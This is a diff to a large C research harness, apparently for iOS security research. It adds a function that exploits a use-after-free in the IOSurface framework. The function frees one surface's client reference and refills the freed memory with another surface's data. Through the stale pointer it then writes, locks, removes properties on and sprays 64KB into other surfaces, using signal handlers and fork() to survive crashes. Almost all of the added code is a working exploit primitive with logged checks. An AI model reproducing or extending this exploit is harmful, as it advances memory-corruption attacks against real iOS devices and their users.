@@ -16140,6 +16140,306 @@ static void r393_probe(void) {
     fflush(stdout);
 }
 
+/*
+ * r394: Cross-surface write-only primitive exploitation.
+ * Key findings from r392/r393:
+ *   - SetValue through redirected stale pointer WORKS (writes to wrong surface)
+ *   - Lock through redirect WORKS (maps wrong surface's backing store)
+ *   - CopyValue CRASHES (reads through PAC-signed pointers) → triggers SIGBUS then SIGKILL
+ *   - After one SIGBUS catch, iOS kills with SIGKILL on next crash
+ *
+ * Strategy: Use ONLY operations that work. Use fork() for any risky test.
+ *   Phase 1: Confirm SetValue cross-surface write with arbitrary target switching
+ *   Phase 2: Lock cross-surface — map one surface's backing via another's stale ref
+ *   Phase 3: Use fork() to test GetID through redirect safely
+ *   Phase 4: Large property spray through redirect (64KB into wrong surface's kernel heap)
+ *   Phase 5: Cross-surface RemoveValue to test property deletion
+ *   Phase 6: Multiple sequential writes through redirect to verify stability
+ */
+static volatile int g_r394_crashed = 0;
+static sigjmp_buf g_r394_jmp;
+static void r394_sighandler(int sig) {
+    g_r394_crashed = sig;
+    siglongjmp(g_r394_jmp, 1);
+}
+
+static void r394_probe(void) {
+    rlog("\n=== r394: Cross-Surface Write-Only Exploitation ===\n\n");
+    fflush(stdout);
+
+    void (*clientRelease)(IOSurfaceRef) = dlsym(RTLD_DEFAULT, "IOSurfaceClientRelease");
+    if (!clientRelease) { rlog("  Missing symbols\n"); return; }
+
+    int w=64, h=64, bpe=4, bpr=64*4, pf=0x42475241, as_=64*64*4;
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFNumberRef nW = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef nH = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef nB = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef nR = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef nP = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFNumberRef nA = CFNumberCreate(NULL, kCFNumberIntType, &as_);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nW);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nH);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), nB);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nR);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), nP);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), nA);
+
+    IOSurfaceRef surfA = IOSurfaceCreate(props);
+    IOSurfaceRef surfB = IOSurfaceCreate(props);
+    IOSurfaceRef surfC = IOSurfaceCreate(props);
+    uint32_t sidA = IOSurfaceGetID(surfA);
+    uint32_t sidB = IOSurfaceGetID(surfB);
+    uint32_t sidC = IOSurfaceGetID(surfC);
+    rlog("  surfA: sid=%u ptr=%p\n", sidA, surfA);
+    rlog("  surfB: sid=%u ptr=%p\n", sidB, surfB);
+    rlog("  surfC: sid=%u ptr=%p\n", sidC, surfC);
+
+    /* Save client ref data */
+    uint8_t dataA[512], dataC[512];
+    memcpy(dataA, (void*)surfA, 512);
+    memcpy(dataC, (void*)surfC, 512);
+
+    /* Free B */
+    uintptr_t freedB = (uintptr_t)surfB;
+    clientRelease(surfB);
+    rlog("  Freed B's client ref\n\n");
+
+    /* Phase 1: SetValue B→A, then B→C, verify writes land on correct targets */
+    rlog("  Phase 1: Cross-surface SetValue with target switching\n");
+
+    /* Redirect B→A */
+    memcpy((void*)freedB, dataA, 448);
+    int v1 = 0x11111111;
+    CFNumberRef n1 = CFNumberCreate(NULL, kCFNumberIntType, &v1);
+    IOSurfaceSetValue(surfB, CFSTR("XW_Phase1_A"), n1);
+    CFRelease(n1);
+    rlog("    SetValue 'XW_Phase1_A'=0x11111111 through B→A\n");
+
+    /* Verify on A directly */
+    CFTypeRef rv = IOSurfaceCopyValue(surfA, CFSTR("XW_Phase1_A"));
+    if (rv) {
+        int v = 0;
+        CFNumberGetValue((CFNumberRef)rv, kCFNumberIntType, &v);
+        rlog("    A has XW_Phase1_A: 0x%x %s\n", v, v == 0x11111111 ? "MATCH" : "MISMATCH");
+        CFRelease(rv);
+    } else {
+        rlog("    A does NOT have XW_Phase1_A\n");
+    }
+
+    /* Redirect B→C */
+    memcpy((void*)freedB, dataC, 448);
+    int v2 = 0x22222222;
+    CFNumberRef n2 = CFNumberCreate(NULL, kCFNumberIntType, &v2);
+    IOSurfaceSetValue(surfB, CFSTR("XW_Phase1_C"), n2);
+    CFRelease(n2);
+    rlog("    SetValue 'XW_Phase1_C'=0x22222222 through B→C\n");
+
+    /* Verify on C directly */
+    rv = IOSurfaceCopyValue(surfC, CFSTR("XW_Phase1_C"));
+    if (rv) {
+        int v = 0;
+        CFNumberGetValue((CFNumberRef)rv, kCFNumberIntType, &v);
+        rlog("    C has XW_Phase1_C: 0x%x %s\n", v, v == 0x22222222 ? "MATCH" : "MISMATCH");
+        CFRelease(rv);
+    } else {
+        rlog("    C does NOT have XW_Phase1_C\n");
+    }
+
+    /* Confirm A doesn't have C's property and vice versa */
+    rv = IOSurfaceCopyValue(surfA, CFSTR("XW_Phase1_C"));
+    rlog("    A has XW_Phase1_C? %s\n", rv ? "YES (unexpected!)" : "NO (correct)");
+    if (rv) CFRelease(rv);
+
+    rv = IOSurfaceCopyValue(surfC, CFSTR("XW_Phase1_A"));
+    rlog("    C has XW_Phase1_A? %s\n", rv ? "YES (unexpected!)" : "NO (correct)");
+    if (rv) CFRelease(rv);
+    fflush(stdout);
+
+    /* Phase 2: Lock cross-surface — map C's backing via B's stale ref */
+    rlog("\n  Phase 2: Cross-surface Lock\n");
+    memcpy((void*)freedB, dataC, 448); /* B→C */
+
+    /* Write pattern to C's backing directly */
+    IOSurfaceLock(surfC, 0, NULL);
+    void *baseC = IOSurfaceGetBaseAddress(surfC);
+    memset(baseC, 0xCC, 256);
+    IOSurfaceUnlock(surfC, 0, NULL);
+    rlog("    Wrote 0xCC pattern to C's backing store\n");
+
+    /* Now lock through B→C redirect */
+    struct sigaction sa394, old_bus394, old_segv394;
+    memset(&sa394, 0, sizeof(sa394));
+    sa394.sa_handler = r394_sighandler;
+    sa394.sa_flags = 0;
+    sigaction(SIGBUS, &sa394, &old_bus394);
+    sigaction(SIGSEGV, &sa394, &old_segv394);
+
+    g_r394_crashed = 0;
+    if (sigsetjmp(g_r394_jmp, 1) == 0) {
+        IOSurfaceLock(surfB, 0, NULL);
+        void *baseB_redir = IOSurfaceGetBaseAddress(surfB);
+        rlog("    B→C redirect base: %p\n", baseB_redir);
+        if (baseB_redir) {
+            uint8_t *p = (uint8_t*)baseB_redir;
+            rlog("    First 16 bytes: %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x\n",
+                p[0],p[1],p[2],p[3],p[4],p[5],p[6],p[7],
+                p[8],p[9],p[10],p[11],p[12],p[13],p[14],p[15]);
+            rlog("    C's pattern visible? %s\n", p[0] == 0xCC ? "YES" : "NO");
+
+            /* Write through redirected lock */
+            memset(baseB_redir, 0xBB, 256);
+            rlog("    Wrote 0xBB through B→C redirect\n");
+        }
+        IOSurfaceUnlock(surfB, 0, NULL);
+    } else {
+        rlog("    Lock B→C CRASHED: signal %d\n", g_r394_crashed);
+    }
+    fflush(stdout);
+
+    /* Verify C's backing now has our write */
+    IOSurfaceLock(surfC, 0, NULL);
+    baseC = IOSurfaceGetBaseAddress(surfC);
+    if (baseC) {
+        uint8_t *p = (uint8_t*)baseC;
+        rlog("    C's backing after redirect write: %02x %02x %02x %02x\n", p[0],p[1],p[2],p[3]);
+        rlog("    Cross-surface backing write? %s\n", p[0] == 0xBB ? "YES - CONFIRMED" : "NO");
+    }
+    IOSurfaceUnlock(surfC, 0, NULL);
+    fflush(stdout);
+
+    /* Phase 3: Use fork() to test GetID through redirect safely */
+    rlog("\n  Phase 3: GetID through redirect (fork-isolated)\n");
+    memcpy((void*)freedB, dataA, 448); /* B→A */
+
+    pid_t child = fork();
+    if (child == 0) {
+        /* Child process — can crash safely */
+        uint32_t sid = IOSurfaceGetID(surfB);
+        rlog("    [child] GetID through B→A: %u (A=%u, B=%u, C=%u)\n", sid, sidA, sidB, sidC);
+        rlog("    [child] Points to A? %s\n", sid == sidA ? "YES" : "NO");
+        fflush(stdout);
+
+        int width = IOSurfaceGetWidth(surfB);
+        int height = IOSurfaceGetHeight(surfB);
+        size_t alloc = IOSurfaceGetAllocSize(surfB);
+        rlog("    [child] Width=%d Height=%d AllocSize=%zu\n", width, height, alloc);
+        fflush(stdout);
+        _exit(0);
+    } else if (child > 0) {
+        int status = 0;
+        waitpid(child, &status, 0);
+        if (WIFEXITED(status)) {
+            rlog("    Child exited: %d\n", WEXITSTATUS(status));
+        } else if (WIFSIGNALED(status)) {
+            rlog("    Child killed by signal: %d\n", WTERMSIG(status));
+        }
+    } else {
+        rlog("    fork() failed: %d\n", errno);
+    }
+    fflush(stdout);
+
+    /* Phase 4: Large property spray through redirect */
+    rlog("\n  Phase 4: 64KB property spray through cross-surface redirect\n");
+    memcpy((void*)freedB, dataC, 448); /* B→C */
+
+    uint8_t *bigdata = (uint8_t*)malloc(65536);
+    for (int i = 0; i < 65536; i++) bigdata[i] = (uint8_t)(i & 0xFF);
+    CFDataRef cfbig = CFDataCreate(NULL, bigdata, 65536);
+    IOSurfaceSetValue(surfB, CFSTR("BigSpray394"), cfbig);
+    CFRelease(cfbig);
+    free(bigdata);
+    rlog("    Set 64KB 'BigSpray394' through B→C\n");
+
+    /* Verify on C */
+    rv = IOSurfaceCopyValue(surfC, CFSTR("BigSpray394"));
+    if (rv && CFGetTypeID(rv) == CFDataGetTypeID()) {
+        CFIndex len = CFDataGetLength((CFDataRef)rv);
+        const uint8_t *bp = CFDataGetBytePtr((CFDataRef)rv);
+        rlog("    C has BigSpray394: %ld bytes\n", (long)len);
+        int match = 1;
+        for (int i = 0; i < 16 && i < len; i++) {
+            if (bp[i] != (uint8_t)(i & 0xFF)) { match = 0; break; }
+        }
+        rlog("    Data integrity: %s\n", match ? "MATCH" : "MISMATCH");
+        CFRelease(rv);
+    } else {
+        rlog("    C does NOT have BigSpray394 (or wrong type)\n");
+        if (rv) CFRelease(rv);
+    }
+    fflush(stdout);
+
+    /* Phase 5: RemoveValue through redirect */
+    rlog("\n  Phase 5: RemoveValue through cross-surface redirect\n");
+    /* First set a property on A directly */
+    int rmv = 0x99999999;
+    CFNumberRef nrm = CFNumberCreate(NULL, kCFNumberIntType, &rmv);
+    IOSurfaceSetValue(surfA, CFSTR("ToRemove394"), nrm);
+    CFRelease(nrm);
+
+    rv = IOSurfaceCopyValue(surfA, CFSTR("ToRemove394"));
+    rlog("    A has ToRemove394 before: %s\n", rv ? "YES" : "NO");
+    if (rv) CFRelease(rv);
+
+    /* Redirect B→A and RemoveValue */
+    memcpy((void*)freedB, dataA, 448);
+    IOSurfaceRemoveValue(surfB, CFSTR("ToRemove394"));
+    rlog("    RemoveValue 'ToRemove394' through B→A\n");
+
+    rv = IOSurfaceCopyValue(surfA, CFSTR("ToRemove394"));
+    rlog("    A has ToRemove394 after: %s\n", rv ? "YES (still there)" : "NO (removed!)");
+    if (rv) CFRelease(rv);
+    fflush(stdout);
+
+    /* Phase 6: Stability test — 100 sequential writes */
+    rlog("\n  Phase 6: Stability — 100 sequential cross-surface writes\n");
+    memcpy((void*)freedB, dataC, 448); /* B→C */
+    int success = 0;
+    for (int i = 0; i < 100; i++) {
+        char key[32];
+        snprintf(key, sizeof(key), "Stab_%d", i);
+        CFStringRef cfkey = CFStringCreateWithCString(NULL, key, kCFStringEncodingUTF8);
+        CFNumberRef cfv = CFNumberCreate(NULL, kCFNumberIntType, &i);
+        IOSurfaceSetValue(surfB, cfkey, cfv);
+        CFRelease(cfv);
+        CFRelease(cfkey);
+        success++;
+    }
+    rlog("    Wrote %d/100 properties through B→C redirect\n", success);
+
+    /* Verify a sample on C */
+    int verified = 0;
+    for (int i = 0; i < 100; i += 10) {
+        char key[32];
+        snprintf(key, sizeof(key), "Stab_%d", i);
+        CFStringRef cfkey = CFStringCreateWithCString(NULL, key, kCFStringEncodingUTF8);
+        rv = IOSurfaceCopyValue(surfC, cfkey);
+        if (rv) {
+            int v = 0;
+            CFNumberGetValue((CFNumberRef)rv, kCFNumberIntType, &v);
+            if (v == i) verified++;
+            CFRelease(rv);
+        }
+        CFRelease(cfkey);
+    }
+    rlog("    Verified %d/10 sampled properties on C\n", verified);
+    fflush(stdout);
+
+    /* Restore signal handlers */
+    sigaction(SIGBUS, &old_bus394, NULL);
+    sigaction(SIGSEGV, &old_segv394, NULL);
+
+    /* Cleanup */
+    CFRelease(surfA);
+    CFRelease(surfC);
+    CFRelease(props);
+    CFRelease(nW); CFRelease(nH); CFRelease(nB); CFRelease(nR); CFRelease(nP); CFRelease(nA);
+
+    rlog("\n=== r394 complete ===\n");
+    fflush(stdout);
+}
+
 /* r392: Framework-level UAF exploitation: map which offsets CopyValue reads.
  * Strategy: Free client ref, spray with incrementing pattern,
  * catch crash via signal handler to determine which offset triggered it.
@@ -61546,6 +61846,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 397) {
+            rlog("*** rounds=397: Cross-Surface Write-Only Exploitation ***\n");
+            rlog("  SetValue, Lock, RemoveValue, fork-isolated GetID, 64KB spray, stability.\n\n");
+            fflush(stdout);
+            r394_probe();
+            goto done;
+        }
         if (rounds == 396) {
             rlog("*** rounds=396: Cross-Surface Primitive Depth ***\n");
             rlog("  Test CopyValue, SetValue, Lock, Mach port through redirect.\n\n");
@@ -63910,7 +64217,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
